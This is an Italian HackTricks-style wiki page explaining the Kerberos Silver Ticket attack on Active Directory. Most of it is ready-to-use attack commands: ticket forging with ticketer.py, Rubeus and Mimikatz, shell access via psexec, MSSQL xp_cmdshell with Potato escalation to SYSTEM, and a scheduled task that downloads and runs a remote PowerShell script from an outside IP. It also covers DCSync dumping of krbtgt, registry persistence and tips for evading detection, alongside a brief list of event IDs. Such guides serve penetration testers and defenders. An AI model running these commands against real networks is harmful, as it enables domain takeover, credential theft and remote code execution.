# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attacco **Silver Ticket** comporta lo sfruttamento dei service ticket negli ambienti Active Directory (AD). Questo metodo si basa sull'**acquisizione dell'hash NTLM di un account di servizio**, ad esempio un account computer, per creare un ticket Ticket Granting Service (TGS) contraffatto. Con questo ticket, un attacker può accedere a servizi specifici della rete, **impersonando qualsiasi utente**, di solito con l'obiettivo di ottenere privilegi amministrativi. Si sottolinea che usare chiavi AES per contraffare i ticket è più sicuro e meno rilevabile.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> I Silver Ticket sono meno rilevabili dei Golden Ticket perché richiedono solo l'**hash dell'account di servizio**, non quello dell'account krbtgt. Tuttavia, sono limitati al servizio specifico che prendono di mira. Inoltre, basta rubare la password di un utente.
Inoltre, se comprometti la **password di un account con uno SPN**, puoi usarla per creare un Silver Ticket che impersoni qualsiasi utente presso quel servizio.

### Modifiche moderne a Kerberos (domini solo AES)

- Gli aggiornamenti di Windows a partire dall'**8 novembre 2022 (KB5021131)** impostano per impostazione predefinita le chiavi di sessione AES per i service ticket, quando possibile, e stanno gradualmente eliminando RC4. Si prevede che entro metà 2026 RC4 sarà **disabilitato per impostazione predefinita** sui DC, quindi affidarsi agli hash NTLM/RC4 per i Silver Ticket fallirà sempre più spesso con `KRB_AP_ERR_MODIFIED`. Estrai sempre le **chiavi AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) per l'account di servizio target.<sup>[[5]](#references)</sup>
- Se `msDS-SupportedEncryptionTypes` dell'account di servizio è limitato ad AES, devi contraffare il ticket con `/aes256` o `-aesKey`; RC4 (`/rc4` o `-nthash`) non funzionerà anche se possiedi l'hash NTLM.<sup>[[6]](#references)</sup>
- Gli account gMSA/computer ruotano ogni 30 giorni; estrai la **chiave AES corrente** da LSASS, Secretsdump/NTDS o DCsync prima di contraffare il ticket.
- OPSEC: la durata predefinita dei ticket negli strumenti è spesso di **10 anni**; imposta durate realistiche (ad es. `-duration 600` minuti) per evitare rilevamenti dovuti a durate anomale.<sup>[[6]](#references)</sup>

Per creare i ticket, si utilizzano strumenti diversi a seconda del sistema operativo:

### Su Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Su Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

Il servizio CIFS è indicato come un target comune per accedere al file system della vittima, ma anche altri servizi come HOST e RPCSS possono essere sfruttati per attività e query WMI.

### Esempio: servizio MSSQL (MSSQLSvc) + Potato per ottenere SYSTEM

Se disponi dell'hash NTLM (o della chiave AES) dell'account proprietario di uno **SPN SQL esatto e registrato**, il servizio potrebbe accettare un service ticket contraffatto. La classe del servizio e il nome host nel ticket devono corrispondere allo SPN effettivo; non dare per scontato che ogni installazione utilizzi `MSSQLSvc/`. L'identità dichiarata deve inoltre essere associata a un login SQL con le autorizzazioni necessarie per abilitare ed eseguire `xp_cmdshell`. I comandi `xp_cmdshell` eseguiti correttamente vengono eseguiti con l'identità del processo del servizio SQL (o con un proxy configurato per i chiamanti non sysadmin). Prima di considerare un percorso Potato separato, verifica che il **token del processo** abbia `SeImpersonatePrivilege` abilitato; la configurazione del servizio o uno SPN, da soli, non lo dimostrano.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Se il contesto risultante dispone di SeImpersonatePrivilege (spesso vero per gli account di servizio), usa una variante Potato per ottenere SYSTEM:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Ulteriori dettagli sull'abuso di MSSQL e sull'abilitazione di xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Panoramica delle tecniche Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Servizi disponibili

| Tipo di servizio                           | Silver Ticket per il servizio                                              |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>A seconda del sistema operativo anche:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In alcuni casi puoi richiedere semplicemente: WINRM</p> |
| Attività pianificate                      | HOST                                                                       |
| Condivisioni file Windows, anche psexec   | CIFS                                                                       |
| Operazioni LDAP, incluso DCSync           | LDAP                                                                       |
| Strumenti di amministrazione remota dei server Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Con **Rubeus** puoi **richiedere tutti** questi ticket usando il parametro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### ID evento dei Silver Ticket

- 4624: accesso dell'account
- 4634: disconnessione dell'account
- 4672: accesso amministratore
- **L'assenza di un 4768/4769 precedente sul DC** per lo stesso client/servizio è un indicatore comune del fatto che un TGS contraffatto venga presentato direttamente al servizio.
- Una durata del ticket insolitamente lunga o un tipo di crittografia inatteso (RC4 quando il dominio impone AES) risaltano anche nei dati 4769/4624.

## Persistenza

Per impedire alle macchine di cambiare password ogni 30 giorni, imposta `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oppure imposta `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` su un valore superiore a 30 giorni per indicare il periodo di rotazione della password delle macchine.<sup>[[3]](#references)</sup>

## Abuso dei ticket di servizio

Negli esempi seguenti, immaginiamo che il ticket sia stato recuperato impersonando l'account amministratore.

### CIFS

Con questo ticket potrai accedere alle cartelle `C$` e `ADMIN$` tramite **SMB** (se sono esposte) e copiare file in una posizione del file system remoto, semplicemente facendo qualcosa del genere:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Potrai anche ottenere una shell sull'host o eseguire comandi arbitrari usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con questa autorizzazione puoi creare scheduled task sui computer remoti ed eseguire comandi arbitrari:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Con questi ticket puoi **eseguire WMI sul sistema vittima**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Trova **maggiori informazioni su wmiexec** nella seguente pagina:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con l'accesso a winrm su un computer puoi **accedervi** e persino ottenere una PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Consulta la seguente pagina per scoprire **altri modi per connettersi a un host remoto usando winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Nota che **winrm deve essere attivo e in ascolto** sul computer remoto per potervi accedere.

### LDAP

Con questo privilegio puoi eseguire il dump del database del DC usando **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Scopri di più su DCSync** nella seguente pagina:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Come attaccare Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Processo della password dell'account computer - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + percorso Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Hardening di Kerberos e deprecazione di RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Opzioni attuali di Impacket ticketer.py (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
